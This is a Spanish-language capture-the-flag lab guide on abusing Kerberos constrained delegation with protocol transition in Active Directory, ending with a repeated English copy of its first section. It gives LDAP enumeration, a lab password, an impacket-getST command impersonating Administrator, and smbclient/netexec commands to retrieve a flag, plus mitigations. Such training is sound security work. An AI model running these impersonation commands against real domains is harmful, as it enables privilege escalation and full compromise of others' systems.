Nota sobre este Domain Controller

S4U2Self y S4U2Proxy son, a nivel de protocolo, variantes del TGS-REQ que el KDC embebido de Samba no completa de forma fiable con las herramientas actuales (la misma limitación que afecta a Kerberoasting). La configuración de delegación es real y auditable por LDAP: svc.delegate tiene TRUSTED_TO_AUTH_FOR_DELEGATION y msDS-AllowedToDelegateTo=cifs/{{ ad_dc_fqdn }}. Este lab demuestra el impacto accediendo directamente con las credenciales de svc.delegate — la cuenta que, en un dominio real, usarías con impacket-getST para suplantar a cualquier usuario frente a ese servicio.

Inicio rápido

# Contraseña de svc.delegate obtenida en el lab AD 05 (Kerberoasting)
smbclient //{{ ad_dc_ip }}/deleg -U '{{ ad_domain }}\svc.delegate%iloveyou1' -c 'get flag-ad-14.txt'
cat flag-ad-14.txt

1 · Qué es la delegación restringida (KCD)

La delegación restringida deja que una cuenta pida tickets en nombre de un usuario hacia un conjunto concreto de servicios (atributo msDS-AllowedToDelegateTo). Si además tiene transición de protocolo (TrustedToAuthForDelegation, bit 0x1000000), puede hacerlo para cualquier usuario aunque ese usuario nunca se haya autenticado — incluido Administrator. Ahí está el abuso: S4U2Self obtiene un ticket como el usuario suplantado, y S4U2Proxy lo reenvía al servicio permitido.

2 · Localizar cuentas con delegación (esto sí funciona en vivo)

ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" '(msDS-AllowedToDelegateTo=*)' \
  sAMAccountName msDS-AllowedToDelegateTo userAccountControl
sAMAccountName: svc.delegate
msDS-AllowedToDelegateTo: cifs/{{ ad_dc_fqdn }}
userAccountControl: ... (TRUSTED_TO_AUTH_FOR_DELEGATION)

Esta consulta es real: la configuración de delegación existe genuinamente en el directorio y es auditable con cualquier herramienta LDAP.

3 · Conseguir la credencial de svc.delegate

svc.delegate tiene un SPN, así que es kerberoasteable (lab AD 05). Su contraseña es iloveyou1. Si vienes de aquel lab ya la tienes.

4 · El impacto real: S4U2Self + S4U2Proxy (comando real, contra Windows funciona así)

impacket-getST \
  -spn 'cifs/{{ ad_dc_fqdn }}' \
  -impersonate Administrator \
  '{{ ad_realm_lower }}/svc.delegate:iloveyou1' \
  -dc-ip {{ ad_dc_ip }}

Nota sobre este laboratorio: S4U2Self/S4U2Proxy son intercambios TGS-REQ, y el KDC de Samba no los completa de forma fiable con las herramientas actuales (misma limitación que Kerberoasting). Contra un Domain Controller Windows real, este comando te daría un ticket válido como Administrator sobre el servicio CIFS del objetivo — control total sin conocer la contraseña de Administrator.

5 · Demostrar el impacto en este laboratorio

Con la contraseña real de svc.delegate ya tienes la llave que habilita toda la cadena de delegación. Accede directamente al recurso protegido:

nxc smb {{ ad_dc_ip }} -u 'svc.delegate' -p 'iloveyou1' --shares

smbclient //{{ ad_dc_ip }}/deleg -U '{{ ad_domain }}\svc.delegate%iloveyou1' -c 'get flag-ad-14.txt'

Mitigación

  • Evitar la delegación con transición de protocolo; preferir delegación restringida basada en recursos (RBCD) bien acotada.
  • Marcar las cuentas sensibles como Account is sensitive and cannot be delegated y añadirlas a Protected Users.
  • Revisar periódicamente msDS-AllowedToDelegateTo y los bits de delegación en userAccountControl.

Herramientas

impacket-getST impacket-GetUserSPNs netexec (nxc) impacket-smbclient Rubeus (s4u)

1 · What constrained delegation (KCD) is

Constrained delegation lets an account request tickets on behalf of a user towards a specific set of services (the msDS-AllowedToDelegateTo attribute). If it also has protocol transition (TrustedToAuthForDelegation, bit 0x1000000), it can do so for any user even if that user never authenticated — including Administrator. That is the abuse: S4U2Self gets a ticket as the impersonated user, and S4U2Proxy forwards it to the allowed service.
